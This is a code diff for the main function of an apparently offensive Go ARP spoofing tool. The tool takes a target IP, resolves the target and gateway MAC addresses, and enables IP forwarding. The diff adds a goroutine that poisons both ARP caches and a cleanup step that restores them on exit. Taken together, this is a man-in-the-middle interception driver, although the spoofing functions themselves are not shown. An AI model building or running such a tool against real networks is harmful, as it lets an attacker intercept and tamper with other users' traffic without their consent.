@@ -1,25 +1,28 @@
 package main
+
 import (
-	"fmt"
 	"flag"
+	"fmt"
 	"os"
+	"os/signal"
+	"syscall"
 )
 
 func main() {
 	// Capturing the ip address from the command line
-	var target_ip_address_flag string
+	var targetIP string
 
-	flag.StringVar(&target_ip_address_flag ,"t", "", "target ip address (required)")
+	flag.StringVar(&targetIP, "t", "", "target ip address (required)")
 	flag.Parse()
 
 	// validate that ip address was provided
-	if target_ip_address_flag == "" {
+	if targetIP == "" {
 		fmt.Println("Error: target IP address is required")
 		fmt.Println("Usage: -t <target_ip_address>")
 		os.Exit(1)
 	}
 
-	fmt.Printf("Target IP address: %v\n", target_ip_address_flag)
+	fmt.Printf("Target IP address: %v\n", targetIP)
 
 	// Get local network information
 	localNetwork, err := GetLocalNetworkInfo()
@@ -44,7 +47,7 @@ func main() {
 	fmt.Printf("  Gateway IP: %s\n", gatewayIP)
 
 	// Get target MAC address via ARP
-	targetMAC, err := GetMACFromIP(target_ip_address_flag, localNetwork)
+	targetMAC, err := GetMACFromIP(targetIP, localNetwork)
 	if err != nil {
 		fmt.Printf("Error: %v\n", err)
 		os.Exit(1)
@@ -58,4 +61,21 @@ func main() {
 		os.Exit(1)
 	}
 	fmt.Printf("Gateway MAC Address: %s\n", gatewayMAC)
+
+	if err := EnableIPForwarding(); err != nil {
+		fmt.Printf("Error: %v\n", err)
+		os.Exit(1)
+	}
+
+	go StartARPSpoofing(localNetwork, targetIP, targetMAC, gatewayIP, gatewayMAC)
+
+	// Block until ctrl+c signal to exit
+	sigChan := make(chan os.Signal, 1)
+	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
+	<-sigChan
+
+	//Cleanup
+	fmt.Println("\nRestoring ARP tables...")
+	RestoreARP(localNetwork, targetIP, targetMAC, gatewayIP, gatewayMAC)
+
 }
